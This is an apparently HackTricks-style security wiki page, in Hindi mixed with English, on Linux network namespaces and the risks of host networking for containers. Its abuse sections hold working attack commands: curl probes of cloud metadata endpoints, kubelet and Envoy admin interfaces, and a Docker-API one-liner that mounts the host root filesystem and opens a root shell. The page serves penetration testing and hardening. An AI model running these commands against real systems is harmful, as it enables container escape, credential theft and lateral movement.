# नेटवर्क Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## अवलोकन

Network namespace interfaces, IP addresses, routing tables, ARP/neighbor state, firewall rules, sockets, UNIX-domain abstract socket namespace और `/proc/net` जैसी files की contents जैसे network-related resources को isolate करता है। इसी वजह से किसी container के पास अपना `eth0`, अपनी local routes और अपना loopback device दिखाई दे सकता है, जबकि उसके पास host का वास्तविक network stack नहीं होता।

Security के दृष्टिकोण से यह महत्वपूर्ण है, क्योंकि network isolation केवल port binding तक सीमित नहीं है। Private network namespace यह सीमित करता है कि workload सीधे तौर पर क्या observe या reconfigure कर सकता है। जब यही namespace host के साथ share किया जाता है, तो container को अचानक host listeners, host-local services, abstract AF_UNIX endpoints और उन network control points की visibility मिल सकती है, जिन्हें application के सामने expose करने का कभी उद्देश्य नहीं था।

## Operation

नया बनाया गया network namespace interfaces attach किए जाने तक एक empty या लगभग empty network environment से शुरू होता है। इसके बाद container runtimes virtual interfaces create या connect करते हैं, addresses assign करते हैं और routes configure करते हैं, ताकि workload को अपेक्षित connectivity मिल सके। Bridge-based deployments में आमतौर पर container को एक veth-backed interface दिखाई देता है, जो host bridge से connected होता है। Kubernetes में CNI plugins Pod networking के लिए इसी तरह का setup संभालते हैं।

यह architecture बताता है कि `--network=host` या `hostNetwork: true` इतना बड़ा बदलाव क्यों है। तैयार private network stack प्राप्त करने के बजाय workload host के वास्तविक network stack से जुड़ जाता है।

## लैब

आप इस command से एक लगभग empty network namespace देख सकते हैं:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
और आप सामान्य तथा host-networked containers की तुलना इससे कर सकते हैं:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
host-networked container के पास अब अपना isolated socket और interface view नहीं है। यह बदलाव अपने आप में ही महत्वपूर्ण है, इससे पहले कि आप यह पूछें कि process के पास कौन-सी capabilities हैं।

## Runtime Usage

Docker और Podman सामान्यतः प्रत्येक container के लिए एक private network namespace बनाते हैं, जब तक कि उन्हें इसके विपरीत configure न किया गया हो। Kubernetes आमतौर पर प्रत्येक Pod को अपना network namespace देता है, जिसे उस Pod के अंदर मौजूद containers share करते हैं, लेकिन host से अलग रहता है। इसका अर्थ है कि `127.0.0.1` आमतौर पर container-local के बजाय Pod-local होता है: केवल localhost पर bound listener सामान्यतः उसके sidecars और siblings से reachable होता है। Incus/LXC systems भी network-namespace आधारित rich isolation प्रदान करते हैं, जिनमें अक्सर virtual networking setups की अधिक variety होती है।

सामान्य principle यह है कि private networking default isolation boundary है, जबकि host networking उस boundary से explicit opt-out है।

## Misconfigurations

सबसे महत्वपूर्ण misconfiguration host network namespace को share करना है। ऐसा कभी-कभी performance, low-level monitoring या convenience के लिए किया जाता है, लेकिन इससे containers के लिए उपलब्ध सबसे स्पष्ट boundaries में से एक हट जाती है। Host-local listeners अधिक direct तरीके से reachable हो जाते हैं, केवल localhost पर उपलब्ध services accessible हो सकती हैं, और `CAP_NET_ADMIN` या `CAP_NET_RAW` जैसी capabilities कहीं अधिक dangerous हो जाती हैं, क्योंकि उनके द्वारा enable किए गए operations अब host के अपने network environment पर लागू होते हैं।

एक अन्य समस्या network namespace के private होने पर भी network-related capabilities को जरूरत से अधिक grant करना है। Private namespace मदद करता है, लेकिन यह raw sockets या advanced network control को harmless नहीं बनाता।

Kubernetes में `hostNetwork: true` यह भी बदलता है कि Pod-level network segmentation पर आप कितना भरोसा कर सकते हैं। Kubernetes के documentation के अनुसार, कई network plugins `podSelector` / `namespaceSelector` matching के लिए `hostNetwork` Pod traffic को ठीक से distinguish नहीं कर सकते और इसलिए उसे ordinary node traffic की तरह treat करते हैं। Attacker के दृष्टिकोण से इसका अर्थ है कि compromised `hostNetwork` workload को अक्सर सामान्य Pod के रूप में नहीं, बल्कि node-level network foothold के रूप में treat करना चाहिए, जो overlay-network workloads जैसी समान policy assumptions से constrained हो।

## Abuse

Weakly isolated setups में attackers host listening services को inspect कर सकते हैं, केवल loopback पर bound management endpoints तक पहुंच सकते हैं, exact capabilities और environment के आधार पर traffic को sniff या interfere कर सकते हैं, अथवा `CAP_NET_ADMIN` मौजूद होने पर routing और firewall state को reconfigure कर सकते हैं। Cluster में इससे lateral movement और control-plane reconnaissance भी आसान हो सकती है।

यदि आपको host networking का संदेह है, तो पहले यह confirm करना शुरू करें कि visible interfaces और listeners isolated container network के बजाय host से संबंधित हैं:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only services अक्सर पहली महत्वपूर्ण खोज होती हैं:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX sockets एक ऐसा target हैं जिन्हें आसानी से नज़रअंदाज़ किया जा सकता है, क्योंकि वे network-namespace scoped होते हैं, भले ही वे TCP/UDP listeners जैसे न दिखें और `/run` के अंतर्गत filesystem paths के रूप में मौजूद न हों। इसलिए host-networked container को उन host-only control channels तक access विरासत में मिल सकता है, जिन्हें container में कभी bind-mounted किया ही नहीं गया था:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
एक ऐतिहासिक उदाहरण `containerd-shim` abstract-socket exposure bug था, लेकिन व्यापक सीख विशिष्ट CVE से अधिक महत्वपूर्ण है: जैसे ही कोई workload host network namespace से जुड़ता है, abstract AF_UNIX services भी attack surface का हिस्सा बन जाती हैं। यदि वे sockets runtime-related या administrative दिखाई दें, तो [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md) पर जाएँ।

यदि network capabilities मौजूद हों, तो जाँचें कि workload दिखाई देने वाले stack का निरीक्षण या उसमें बदलाव कर सकता है या नहीं:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
आधुनिक kernels पर, host networking और `CAP_NET_ADMIN` केवल साधारण `iptables` / `nftables` बदलावों से आगे packet path को भी expose कर सकते हैं। `tc` qdiscs और filters भी namespace-scoped होते हैं, इसलिए shared host network namespace में वे उन host interfaces पर लागू होते हैं जिन्हें container देख सकता है। यदि `CAP_BPF` भी मौजूद हो, तो TC और XDP loaders जैसे network-related eBPF programs भी relevant हो जाते हैं:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
यह इसलिए महत्वपूर्ण है क्योंकि attacker केवल firewall rules को rewrite ही नहीं, बल्कि host interface स्तर पर traffic को mirror, redirect, shape या drop भी कर सकता है। private network namespace में ये actions केवल container view तक सीमित रहते हैं; shared host namespace में इनका प्रभाव host पर पड़ता है।

cluster या cloud environments में, host networking metadata और control-plane-adjacent services की quick local recon को भी उचित ठहराती है:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Kubernetes में याद रखें कि multi-container Pod में **किसी भी** container को compromise करने से sibling containers और sidecars द्वारा खोले गए localhost listeners तक भी access मिल जाता है, क्योंकि पूरा Pod एक ही network namespace साझा करता है। यह service-mesh, observability और helper containers के लिए विशेष रूप से महत्वपूर्ण है, जिनके admin या debug interfaces जानबूझकर cluster-wide के बजाय केवल Pod-internal होते हैं:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
"bound to localhost" को **Pod-private** मानें, **container-private** नहीं। Pod में मौजूद किसी एक container के compromise होने के बाद यह धारणा समाप्त हो जाती है।

### पूरा उदाहरण: Host Networking + Local Runtime / Kubelet Access

Host networking अपने-आप host root प्रदान नहीं करता, लेकिन यह अक्सर ऐसी services को उजागर कर देता है जिन्हें जानबूझकर केवल node के भीतर से पहुंच योग्य बनाया गया होता है। यदि उन services में से किसी एक की सुरक्षा कमजोर है, तो Host networking privilege-escalation का सीधा मार्ग बन जाता है।

localhost पर Docker API:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost पर Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
प्रभाव:

- यदि local runtime API उचित protection के बिना exposed हो, तो direct host compromise
- यदि kubelet या local agents reachable हों, तो cluster reconnaissance या lateral movement
- `CAP_NET_ADMIN` के साथ combined होने पर traffic manipulation या denial of service

## Checks

इन checks का goal यह जानना है कि process के पास private network stack है या नहीं, कौन-से routes और listeners visible हैं, और capabilities को test करने से पहले ही network view host जैसा दिखाई देता है या नहीं।
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
यहाँ क्या महत्वपूर्ण है:

- यदि `/proc/self/ns/net` और `/proc/1/ns/net` पहले से host-जैसे दिखाई देते हैं, तो container संभवतः host network namespace या किसी अन्य non-private namespace को share कर रहा है।
- `lsns -t net` और `ip netns identify` तब उपयोगी होते हैं जब shell पहले से किसी named या persistent namespace के अंदर हो और आप उसे host side के `/run/netns` objects के साथ correlate करना चाहते हों।
- `ss -lntup` विशेष रूप से महत्वपूर्ण है क्योंकि यह loopback-only listeners और local management endpoints दिखाता है। `ss -xap` और `/proc/net/unix` वह abstract-socket view जोड़ते हैं, जो सामान्य filesystem socket hunts में छूट जाता है।
- यदि `CAP_NET_ADMIN`, `CAP_NET_RAW` या `CAP_BPF` मौजूद हों, तो routes, interface names, firewall context, `tc` state और eBPF attachments अधिक महत्वपूर्ण हो जाते हैं।
- Kubernetes में `hostNetwork` Pod से failed service-name resolution का अर्थ केवल यह हो सकता है कि Pod `dnsPolicy: ClusterFirstWithHostNet` का उपयोग नहीं कर रहा है; इसका अर्थ यह नहीं है कि service मौजूद नहीं है।
- multi-container Pods में localhost listeners पूरे Pod network namespace से संबंधित होते हैं, इसलिए compromised container से loopback-only port को unreachable मानने से पहले sidecars और sibling containers की जाँच करें।

किसी container की समीक्षा करते समय network namespace का मूल्यांकन हमेशा capability set के साथ करें। Host networking और strong network capabilities का posture, bridge networking और narrow default capability set वाले posture से बहुत अलग होता है।

## References

- [Kubernetes NetworkPolicy और `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` और abstract UNIX socket isolation](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: host-network containers के सामने exposed abstract Unix domain sockets](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [network-related eBPF programs के लिए eBPF token और capability requirements](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
